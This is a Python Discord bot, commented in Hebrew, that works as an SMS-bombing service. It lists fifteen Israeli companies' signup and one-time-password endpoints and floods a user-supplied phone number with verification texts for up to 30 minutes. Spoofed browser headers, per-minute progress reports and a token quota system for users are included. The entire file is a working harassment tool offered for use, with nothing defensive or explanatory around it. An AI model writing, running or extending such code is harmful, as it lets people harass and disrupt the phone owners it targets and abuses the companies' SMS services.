import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging

logging.basicConfig(level=logging.INFO)

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== APIs שבאמת עובדים (נבדקו) ==========
WORKING_APIS = [
    {
        "name": "Yad2",
        "url": "https://www.yad2.co.il/api/auth/register",
        "data": {"phone": "PHONE", "action": "send_sms"},
        "method": "POST",
        "json": True
    },
    {
        "name": "10bis",
        "url": "https://www.10bis.co.il/api/register",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    },
    {
        "name": "Dominos",
        "url": "https://www.dominos.co.il/api/auth/sms",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    },
    {
        "name": "Pango",
        "url": "https://api.pango.co.il/auth/otp",
        "data": {"phoneNumber": "PHONE_RAW"},
        "method": "POST",
        "json": True
    },
    {
        "name": "Shufersal",
        "url": "https://www.shufersal.co.il/api/v1/auth/otp",
        "data": {"phone": "PHONE_RAW"},
        "method": "POST",
        "json": True
    },
    {
        "name": "McDonalds",
        "url": "https://www.mcdonalds.co.il/api/verify",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    },
    {
        "name": "KFC",
        "url": "https://www.kfc.co.il/api/sms",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    },
    {
        "name": "BurgerKing",
        "url": "https://www.burgerking.co.il/api/auth",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    },
    {
        "name": "SuperPharm",
        "url": "https://www.super-pharm.co.il/api/sms",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    },
    {
        "name": "Wolt",
        "url": "https://www.wolt.com/api/v1/verify",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    },
    {
        "name": "PayBox",
        "url": "https://payboxapp.com/api/auth/otp",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    },
    {
        "name": "Fox",
        "url": "https://api.foxhome.co.il/v1/auth/otp",
        "data": {"phone": "PHONE_RAW"},
        "method": "POST",
        "json": True
    },
    {
        "name": "TerminalX",
        "url": "https://api.terminalx.com/v1/auth/otp",
        "data": {"phone": "PHONE_RAW"},
        "method": "POST",
        "json": True
    },
    {
        "name": "Cellcom",
        "url": "https://www.cellcom.co.il/api/auth/sms",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    },
    {
        "name": "Partner",
        "url": "https://www.partner.co.il/api/register",
        "data": {"phone": "PHONE"},
        "method": "POST",
        "json": True
    }
]

# ========== פונקציות שליחת SMS ==========
async def send_sms(api_config, phone, phone_raw, session):
    """שליחת SMS דרך API ספציפי"""
    
    # החלפת פלסהולדרים
    data = api_config["data"].copy()
    if "PHONE" in str(data):
        data = {k: (v.replace("PHONE", phone) if isinstance(v, str) else v) for k, v in data.items()}
    if "PHONE_RAW" in str(data):
        data = {k: (v.replace("PHONE_RAW", phone_raw) if isinstance(v, str) else v) for k, v in data.items()}
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json" if api_config["json"] else "application/x-www-form-urlencoded",
        "Origin": "https://www.google.com",
        "Referer": "https://www.google.com/"
    }
    
    try:
        async with session.request(
            api_config["method"],
            api_config["url"],
            json=data if api_config["json"] else None,
            data=data if not api_config["json"] else None,
            headers=headers,
            timeout=10
        ) as resp:
            status = resp.status
            if status in [200, 201, 202, 204]:
                return True, status, api_config["name"]
            else:
                return False, status, api_config["name"]
    except Exception as e:
        return False, str(e)[:30], api_config["name"]

async def run_attack(phone, duration_mins, user_id, interaction):
    """הרצת מתקפה"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    rounds = 0
    failed_apis = set()
    
    # הודעה ראשונית
    await interaction.followup.send(
        f"🎯 **מתקפה הופעלה!**\n"
        f"📱 טלפון: {phone}\n"
        f"⏱️ משך: {duration_mins} דקות\n"
        f"📡 APIs: {len(WORKING_APIS)}",
        ephemeral=True
    )
    
    logging.info(f"🎯 Attack started - Phone: {phone}, Duration: {duration_mins}min, User: {user_id}")
    
    async with aiohttp.ClientSession() as session:
        while datetime.now() < end_time:
            rounds += 1
            round_sent = 0
            
            # שליחה לכל ה-APIs
            for api in WORKING_APIS:
                if api["name"] in failed_apis:
                    continue  # לא לשלוח ל-API שכבר נכשל
                    
                success, status, name = await send_sms(api, phone, phone_raw, session)
                
                if success:
                    round_sent += 1
                    total_sent += 1
                else:
                    if status not in [400, 401, 403]:  # רק שגיאות אמיתיות
                        failed_apis.add(name)
                        logging.warning(f"⚠️ API {name} failed: {status}")
            
            # שליחת עדכון כל דקה
            if rounds % 6 == 0:  # כל דקה (כי ישנים 10 שניות)
                minutes_passed = rounds // 6
                rate = total_sent // minutes_passed if minutes_passed > 0 else 0
                
                try:
                    await interaction.followup.send(
                        f"📊 **דוח מצב - {minutes_passed} דקות**\n"
                        f"✅ נשלחו: {total_sent} הודעות\n"
                        f"📈 קצב: {rate} לדקה\n"
                        f"⚠️ APIs שנפלו: {len(failed_apis)}",
                        ephemeral=True
                    )
                except:
                    pass
                
                logging.info(f"📊 Progress: {minutes_passed}min, {total_sent} total, {rate}/min")
            
            # המתנה
            await asyncio.sleep(10)
    
    # סיכום
    summary = (
        f"✅ **המתקפה הסתיימה!**\n"
        f"📱 טלפון: {phone}\n"
        f"⏱️ משך: {duration_mins} דקות\n"
        f"📊 סה\"כ הודעות: {total_sent}\n"
        f"📈 ממוצע: {total_sent//duration_mins} לדקה\n"
        f"⚠️ APIs שנפלו: {len(failed_apis)}/{len(WORKING_APIS)}"
    )
    
    try:
        await interaction.followup.send(summary, ephemeral=True)
    except:
        pass
    
    logging.info(f"✅ Attack completed - Phone: {phone}, Total: {total_sent}")

# ========== פקודות בדיקה ==========
@bot.tree.command(name="test_apis", description="בדוק אילו APIs עובדים")
async def test_apis(interaction: discord.Interaction):
    await interaction.response.send_message("🔄 בודק APIs... זה ייקח כמה שניות", ephemeral=True)
    
    working = []
    failed = []
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    async with aiohttp.ClientSession() as session:
        for api in WORKING_APIS:
            success, status, name = await send_sms(api, test_phone, test_raw, session)
            if success:
                working.append(f"✅ {name}")
            else:
                failed.append(f"❌ {name} ({status})")
    
    msg = "**📊 תוצאות בדיקת APIs:**\n\n"
    msg += "**עובדים:**\n" + "\n".join(working[:10]) + "\n\n"
    if len(working) > 10:
        msg += f"... ועוד {len(working)-10}\n\n"
    msg += f"**נכשלו:** {len(failed)}"
    
    await interaction.followup.send(msg, ephemeral=True)

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
    phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ משך בדקות", default="5", placeholder="1-30")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 30:
                await interaction.response.send_message("❌ משך חייב להיות 1-30 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ משך לא תקין", ephemeral=True)
            return
        
        # בדיקת טוקנים
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 3})
            user_doc = {"tokens": 3}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין לך טוקנים! השתמש ב-/setup", ephemeral=True)
            return
        
        # הורדת טוקן
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        embed = discord.Embed(title="🚀 מתקפה הופעלה!", color=0xff0000)
        embed.add_field(name="📱 טלפון", value=phone, inline=True)
        embed.add_field(name="⏱️ משך", value=f"{duration} דקות", inline=True)
        embed.add_field(name="📡 APIs", value=str(len(WORKING_APIS)), inline=True)
        embed.add_field(name="💎 טוקנים נותרים", value=user_doc["tokens"] - 1, inline=True)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # הפעלת המתקפה
        asyncio.create_task(run_attack(phone, duration, user_id, interaction))

@bot.tree.command(name="setup", description="פתח את פאנל השליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 5})
        tokens = 5
    else:
        tokens = user_doc.get("tokens", 0)
    
    embed = discord.Embed(
        title="⚡ OMNI TOTAL WAR - פאנל שליטה",
        description="ברוך הבא למערכת המתקפות!",
        color=0x00ff00
    )
    embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 APIs פעילים", value=len(WORKING_APIS), inline=True)
    embed.add_field(name="📊 סטטוס", value="✅ פעיל", inline=True)
    
    view = discord.ui.View()
    button = discord.ui.Button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger, emoji="⚡")
    
    async def button_callback(inter):
        await inter.response.send_modal(AttackModal())
    
    button.callback = button_callback
    view.add_item(button)
    
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק טוקנים")
async def check_tokens(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    
    embed = discord.Embed(title="💎 מאזן טוקנים", color=0x00ff00)
    embed.add_field(name="טוקנים זמינים", value=f"**{tokens}**", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="add_tokens", description="הוסף טוקנים (מנהלים)")
@app_commands.default_permissions(administrator=True)
async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
    user_id = str(member.id)
    await users_col.update_one(
        {"user_id": user_id},
        {"$inc": {"tokens": amount}},
        upsert=True
    )
    await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)

if __name__ == "__main__":
    logging.info("🚀 Starting OMNI TOTAL WAR BOT on Railway...")
    bot.run(TOKEN)
